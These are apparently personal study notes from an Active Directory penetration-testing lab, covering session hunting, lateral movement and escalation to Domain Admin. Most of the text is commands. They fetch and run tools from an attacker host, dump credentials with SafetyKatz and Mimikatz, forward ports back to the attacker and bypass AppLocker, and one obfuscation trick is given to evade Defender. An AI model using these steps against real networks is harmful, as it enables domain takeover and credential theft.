## Identify a machine in the target domain where a Domain Admin session is available

importing SessionHunter (don't need admin access)
`C:\AD\Tools\Invoke-SessionHunter.ps1`

Searching for active sessions
`Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
![Pasted image 20260204011936](assets/Pasted%20image%2020260204011936.png)


## Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on dcorp-ci

Download  script logging blocker onto compromised machine then run it (can use HFS)
`iex (iwr http://<IP>/sbloggingbypass.txt -UseBasicParsing)`
**OR**
you can just copy paste the bypass
![Pasted image 20260204012406](assets/Pasted%20image%2020260204012406.png)

Import PowerView onto compromised machine
`iex ((New-Object Net.WebClient).DownloadString('http://<IP>/PowerView.ps1))`

List the sessions on the domain (needs admin access)
`Find-DomainUserLocation`
![Pasted image 20260204012710](assets/Pasted%20image%2020260204012710.png)

Test to see if user has access to above machine using winrs
`winrs -r:dcorp-mgmt cmd /c "set computername && set username"`

Extract credentials from dcorp-mgmt -- first need Loader.exe
- loader.exe runs processes in memory
- Download to first machine we got access to
`iwr http://<IP>/Loader.exe -OutFile C:\Users\Public\Loader.exe`
- run SafetyKatz on new machine stealthily
`winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://<IP>/SafetyKatz.exe sekurlsa::evasive-keys exit"
- defender will complain about this one, but keeping it here just in case -- real solution below

pipe command to null, set up port forward on machine
`$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker_ip>`

now download SafetyKatz using port forwarding, now downloading from local loopback
`$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"`
- using evasive-keys instead of ekeys since defender wouldn't like ekeys

credentials for svcadmin (user with session) found in SafetyKatz output
![Pasted image 20260204013753](assets/Pasted%20image%2020260204013753.png)
- can see password in cleartext because there is a service on dcorp-mgmt that is running with the privileges of svcadmin
- for this objective, we want the aes256 key

Use loader.exe to run Rubeus to get the Kerberos ticket (OPtH)
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<aes_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
- will spawn a new process with svcadmin privileges, but whoami will show the old user (logon type 9)
`winrs -r:dcorp-dc cmd /c set username`
![Pasted image 20260204014308](assets/Pasted%20image%2020260204014308.png)


## Escalate privilege to DA by abusing derivative local admin through dcorp-adminsrv. On dcorp-adminrv, tackle allowlisting using
- gaps in Applocker rules
- disable Applocker by modifying GPO applicable to dcorp-adminsrv

Derivative local admin
![Pasted image 20260204014642](assets/Pasted%20image%2020260204014642.png)
- since student has administrative access to adminsrv, and adminsrv can get credentials for administrator on mgmt, student is a derivative admin of mgmt


access dcorp-adminsrv
`Enter-PSSession dcorp-adminsrv`

Fix AMSI bypass (script logging) when you get the error "Method Invocation is supported only on core types in this language mode"
- happens to him when he enters a remote PowerShell session, not sure if that is all cases
![Pasted image 20260204014940](assets/Pasted%20image%2020260204014940.png)
- check language mode
`$ExecutionContext.SessionState.LanguageMode
- this error happens in ConstrainedLanguage
	- InviShell puts it in FullLanguage (most free)

confirm that there is Applocker on the machine
`Get-AppLockerPolicy -Effective`
![Pasted image 20260204015300](assets/Pasted%20image%2020260204015300.png)


### Gaps in Applocker
look at Applocker rules
`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
- UserOrGroupSid = S-1-1-0 -> everyone can run the binary
![Pasted image 20260204015422](assets/Pasted%20image%2020260204015422.png)
- can see that any user can run any binary from %PROGRAMFILES% and %WINDIR%
![Pasted image 20260204015501](assets/Pasted%20image%2020260204015501.png)
- can use Invoke-Mimikatz in %PROGRAMFILES%
	- says "this will be the only situation we will use Invoke-Mimikatzs

copy Invoke-Mimi.ps1 in Program Files - heavily modified version of Mimikatz
`Copy-Item C:\AD\Tools\Invoke-Mimi.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'`

run Invoke-Mimi.ps1
`.\Invoke-Mimi.ps1`
- might say it was defined in a different language mode if you try to dot source it 
	- `. .\Invoke-Mimi.ps1`

if above doesn't work, you can try the following modifications to Invoke-Mimi
```
$8 = "s";
$c = "e";
$g = "k";
$t = "u";
$p = "r";
$n = "l";
$7 = "s";
$6 = "a";
$1 = ":";
$2 = ":";
$z = "e";
$e = "k";
$0 = "e";
$s = "y";
$l = "s";
$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $1 + $2 + $z = $e + $0 + $s + $l ;

Invoke-Mimi -Command $Pwn
```
- append to end of Invoke-Mimi, save new copy as Invoke-MimiEx-keys-std1.ps1
- also prevents detection
![Pasted image 20260204031631](assets/Pasted%20image%2020260204031631.png)

`./Invoke-MimiEx-keys-std1.ps1`
![Pasted image 20260204031606](assets/Pasted%20image%2020260204031606.png)

can also do the same for credential vault, but it doesn't need to be encoded
- just add the following to the end of Invoke-Mimi.ps1
```
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```
- name this new copy Invoke-MimiEx-vault-std1.ps1
![Pasted image 20260204031938](assets/Pasted%20image%2020260204031938.png)

run credential manager dump on Invoke-MimiEx-vault-std.ps1
`.\Invoke-MimiEz-vault-std1.ps1`
![Pasted image 20260204032148](assets/Pasted%20image%2020260204032148.png)
- aes key is a little below this

can log in with srvadmin using runas
`runas /user:dcorp\srvadmin /netonly cmd`
- spawns a new cmd process as srvadmin

Check if srvadmin has administrative access on any machines
`. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
`Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose`
![Pasted image 20260204032554](assets/Pasted%20image%2020260204032554.png)


next steps are the same as the reverse shell exploitation, just using a different path
- set up port forwarding again
`$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker_ip>

run SafetyKatz on mgmt now that we have access
`$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"`



### Disable Applocker with GPOs

need GenericAll/GenericWrite over Applocker GPO (look at BloodHound)
- make sure your process is actually running as the account with these perms

open Group Policy Management
`gpmc.msc`

edit Applocker from Domains > \<DOMAIN\> > Applocked > Applocker
![Pasted image 20260204033407](assets/Pasted%20image%2020260204033407.png)

edit the policy through Computer Configuration > Policies > Windows Settings > Security Settings > Application Control Policies > Applocker > Executable Rules > Delete Executable Rules

force GPO update
`gpupdate /force`

copy Loader.exe over to the machine
`echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe`
- echo flag may be different from 'F'

log into the machine with winrs since we aren't using PowerShell
`winrs -r:dcorp-adminsrv cmd`

set up port forward
`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker_ip>`

run loader to download SafetyKatz
`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`
- should see a GET request on your web server, and shortly after SafetyKatz is run you should get mimikatz output
- 